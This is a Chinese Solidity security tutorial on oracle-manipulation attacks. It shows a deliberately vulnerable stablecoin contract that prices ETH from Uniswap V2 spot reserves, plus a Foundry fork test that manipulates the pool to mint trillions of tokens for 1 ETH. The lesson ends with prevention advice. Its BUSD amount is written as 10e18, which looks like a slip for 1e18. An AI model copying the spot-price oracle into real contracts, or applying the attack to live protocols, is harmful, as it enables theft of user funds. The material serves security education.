---
title: S15. 操纵预言机
tags:
- solidity
- security
- oracle

---

# WTF Solidity 合约安全: S15. 操纵预言机

我最近在重新学solidity，巩固一下细节，也写一个“WTF Solidity极简入门”，供小白们使用（编程大佬可以另找教程），每周更新1-3讲。

推特：[@0xAA_Science](https://twitter.com/0xAA_Science)｜[@WTFAcademy_](https://twitter.com/WTFAcademy_)

社区：[Discord](https://discord.gg/5akcruXrsk)｜[微信群](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[官网 wtf.academy](https://wtf.academy)

所有代码和教程开源在github: [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTFSolidity)

-----

这一讲，我们将介绍智能合约的操纵预言机攻击，并复现了一个攻击示例：用`1 ETH`兑换17万亿枚稳定币。仅2022年一年，操纵预言机攻击造成用户资产损失超过 2 亿美元。

## 价格预言机

出于安全性的考虑，以太坊虚拟机（EVM）是一个封闭孤立的沙盒。在EVM上运行的智能合约可以接触链上信息，但无法主动和外界沟通获取链下信息。但是，这类信息对去中心化应用非常重要。

预言机（oracle）可以帮助我们解决这个问题，它从链下数据源获得信息，并将其添加到链上，供智能合约使用。

其中最常用的就是价格预言机（price oracle），它可以指代任何可以让你查询币价的数据源。典型用例：
- 去中心借贷平台（AAVE）使用它来确定借款人是否已达到清算阈值。
- 合成资产平台（Synthetix）使用它来确定资产最新价格，并支持 0 滑点交易。
- MakerDAO使用它来确定抵押品的价格，并铸造相应的稳定币 $DAI。

![](./img/S15-1.png)

## 预言机漏洞

如果预言机没有被开发者正确使用，会造成很大的安全隐患。

- 2021年10月，BNB链上的DeFi平台Cream Finance因为预言机漏洞[被盗用户资金 1.3亿 美元](https://rekt.news/cream-rekt-2/)。
- 2022年5月，Terra链上的合成资产平台Mirror Protocol因为预言机漏洞[被盗用户资金 1.15亿 美元](https://rekt.news/mirror-rekt/)。
- 2022年10月，Solana链上的去中心化借贷平台Mango Market因为预言机漏洞[被盗用户资金 1.15亿 美元](https://rekt.news/mango-markets-rekt/)。

## 漏洞例子

下面我们学习一个预言机漏洞的例子，`oUSD` 合约。该合约是一个稳定币合约，符合ERC20标准。类似合成资产平台Synthetix，用户可以在这个合约中零滑点的将 `ETH` 兑换为 `oUSD`（Oracle USD）。兑换价格由自定义的价格预言机（`getPrice()`函数）决定，这里采取的是Uniswap V2的 `WETH-BUSD` 的瞬时价格。在之后的攻击示例例子中，我们会看到这个预言机非常容易被操纵。

### 漏洞合约

`oUSD`合约包含`7`个状态变量，用来记录`BUSD`，`WETH`，`UniswapV2`工厂合约，和`WETH-BUSD`币对合约的地址。

`oUSD`合约主要包含`3`个函数:
- 构造函数: 初始化 `ERC20` 代币的名称和代号。
- `getPrice()`：价格预言机，获取Uniswap V2的 `WETH-BUSD` 的瞬时价格，这也是漏洞所在。
  ```
    // 获取ETH price
    function getPrice() public view returns (uint256 price) {
        // pair 交易对中储备
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        // ETH 瞬时价格
        price = reserve0/reserve1;
    }
  ```
- `swap()`：兑换函数，将 `ETH` 以预言机给定的价格兑换为 `oUSD`。

合约代码：

```solidity
contract oUSD is ERC20{
    // 主网合约
    address public constant FACTORY_V2 =
        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;

    IUniswapV2Factory public factory = IUniswapV2Factory(FACTORY_V2);
    IUniswapV2Pair public pair = IUniswapV2Pair(factory.getPair(WETH, BUSD));
    IERC20 public weth = IERC20(WETH);
    IERC20 public busd = IERC20(BUSD);

    constructor() ERC20("Oracle USD","oUSD"){}

    // 获取ETH price
    function getPrice() public view returns (uint256 price) {
        // pair 交易对中储备
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        // ETH 瞬时价格
        price = reserve0/reserve1;
    }

    function swap() external payable returns (uint256 amount){
        // 获取价格
        uint price = getPrice();
        // 计算兑换数量
        amount = price * msg.value;
        // 铸造代币
        _mint(msg.sender, amount);
    }
}
```

### 攻击思路

我们针对有漏洞的价格预言机 `getPrice()` 函数进行攻击，步骤：

1. 准备一些 `BUSD`，可以是自有资金，也可以是闪电贷借款。在实现中，我们利用 Foundry 的 `deal` cheatcode 在本地网络上给自己铸造了 `1_000_000 BUSD`
2. 在 UniswapV2 的 `WETH-BUSD` 池中大量买入 `WETH`。具体实现见攻击代码的 `swapBUSDtoWETH()` 函数。
3. `WETH` 瞬时价格暴涨，这时我们调用 `swap()` 函数将 `ETH` 转换为 `oUSD`。
4. **可选:** 在 UniswapV2 的 `WETH-BUSD` 池中卖出第2步买入的 `WETH`，收回本金。

这4步可以在一个交易中完成。

### Foundry 复现

我们选用 Foundry 进行操纵预言机攻击的复现，因为它很快，并且可以创建主网的本地分叉，方便测试。如果你不了解 Foundry，可以阅读 [WTF Solidity工具篇 T07: Foundry](https://github.com/AmazingAng/WTFSolidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md)。

1. 在安装好 Foundry 之后，在命令行输入下列命令启动新项目，并安装 openzeppelin 库。
  ```shell
  forge init Oracle
  cd Oracle
  forge install Openzeppelin/openzeppelin-contracts
  ```

2. 在根目录下创建 `.env` 环境变量文件，并在其中添加主网rpc，用于创建本地测试网。

  ```
  MAINNET_RPC_URL= https://rpc.ankr.com/eth
  ```

3. 将这一讲的代码，`Oracle.sol` 和 `Oracle.t.sol`，分别复制到根目录的 `src` 和 `test` 文件夹下，然后使用下列命令启动攻击脚本。

  ```
  forge test -vv --match-test testOracleAttack
  ```

4. 我们可以在终端中看到攻击结果。在攻击前，预言机 `getPrice()` 给出的 `ETH`
价格为 `1216 USD`，是正常的。但在我们使用 `1,000,000` BUSD 在 UniswapV2 的 `WETH-BUSD` 池子中买入 `WETH` 之后，预言机给出的价格被操纵为 `17,979,841,782,699 USD`。这时，我们可以轻松的用 `1 ETH` 兑换17万亿枚 `oUSD`，完成攻击。
  ```shell
  Running 1 test for test/Oracle.t.sol:OracleTest
  [PASS] testOracleAttack() (gas: 356524)
  Logs:
    1. ETH Price (before attack): 1216
    2. Swap 1,000,000 BUSD to WETH to manipulate the oracle
    3. ETH price (after attack): 17979841782699
    4. Minted 1797984178269 oUSD with 1 ETH (after attack)

  Test result: ok. 1 passed; 0 failed; finished in 262.94ms
  ```

攻击代码：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Oracle.sol";

contract OracleTest is Test {
    address private constant alice = address(1);
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router router;
    IWETH private weth = IWETH(WETH);
    IBUSD private busd = IBUSD(BUSD);
    string MAINNET_RPC_URL;
    oUSD ousd;

    function setUp() public {
        MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
        // fork指定区块
        vm.createSelectFork(MAINNET_RPC_URL,16060405);
        router = IUniswapV2Router(ROUTER);
        ousd = new oUSD();
    }

    //forge test --match-test  testOracleAttack  -vv
    function testOracleAttack() public {
        // 攻击预言机
        // 0. 操纵预言机之前的价格
        uint256 priceBefore = ousd.getPrice();
        console.log("1. ETH Price (before attack): %s", priceBefore); 
        // 给自己账户 1000000 BUSD
        uint busdAmount = 1_000_000 * 10e18;
        deal(BUSD, alice, busdAmount);
        // 2. 用busd买weth，推高顺时价格
        vm.prank(alice);
        busd.transfer(address(this), busdAmount);
        swapBUSDtoWETH(busdAmount, 1);
        console.log("2. Swap 1,000,000 BUSD to WETH to manipulate the oracle");
        // 3. 操纵预言机之后的价格
        uint256 priceAfter = ousd.getPrice();
        console.log("3. ETH price (after attack): %s", priceAfter); 
        // 4. 铸造oUSD
        ousd.swap{value: 1 ether}();
        console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/10e18); 
    }

    // Swap BUSD to WETH
    function swapBUSDtoWETH(uint amountIn, uint amountOutMin)
        public
        returns (uint amountOut)
    {   
        busd.approve(address(router), amountIn);

        address[] memory path;
        path = new address[](2);
        path[0] = BUSD;
        path[1] = WETH;

        uint[] memory amounts = router.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            alice,
            block.timestamp
        );

        // amounts[0] = BUSD amount, amounts[1] = WETH amount
        return amounts[1];
    }
}
```

## 预防方法

知名区块链安全专家 `samczsun` 在一篇[博客](https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle)中总结了预言机操纵的预防方法，这里总结一下：

1. 不要使用流动性差的池子做价格预言机。
2. 不要使用现货/瞬时价格做价格预言机，要加入价格延迟，例如时间加权平均价格（TWAP）。
3. 使用去中心化的预言机。
4. 使用多个数据源，每次选取最接近价格中位数的几个作为预言机，避免极端情况。
5. 仔细阅读第三方价格预言机的使用文档及参数设置。

## 总结

这一讲，我们介绍了操纵预言机攻击，并攻击了一个有漏洞的合成稳定币合约，使用`1 ETH`兑换了17万亿稳定币，成为了世界首富（并没有）。


